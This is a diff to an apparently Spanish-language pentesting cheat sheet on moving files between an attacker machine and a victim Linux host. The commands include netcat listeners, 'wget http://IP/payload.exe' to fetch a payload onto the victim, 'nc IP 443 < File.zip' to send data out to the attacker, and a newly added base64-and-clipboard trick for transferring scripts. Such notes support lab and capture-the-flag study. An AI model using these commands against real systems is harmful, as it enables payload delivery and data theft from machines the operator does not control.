@@ -64,13 +64,15 @@ C:\Windows\Temp
 
 1. ❯ python3 -m http.server 80          # Creamos un servidor para poder pasar los archivos a la maquina Linux
 2. ❯ nc -nlvp 443 > file.zip            # Se hace esto para descargar un archivo de la maquina victima con Netcat
+3. ❯ base64 -w 0 script.sh | xclip -sel clip      # Transferir un script cuando no existe nano, nvim, trasformamos a base64 y lo copiamos a la clipboard
 ```
 
 ```bash 
 # Victima Linux
 
-1. ❯ wget http://IP/payload.exe         # Para descargar el payload de la maquina Linux
-2. ❯ nc IP 443 < File.zip               # Para pasar un archivo a la maquina de atacante 
+1. ❯ wget http://IP/payload.exe             # Para descargar el payload de la maquina Linux
+2. ❯ nc IP 443 < File.zip                   # Para pasar un archivo a la maquina de atacante 
+3. ❯ echo abcdef | base64 -d > script.sh    # Pegamos el contenido anterior en 'base64', lo decodeamos y guardamos 
 ```
 
 ## Compartir archivos en un SMB de Linux a Windows 
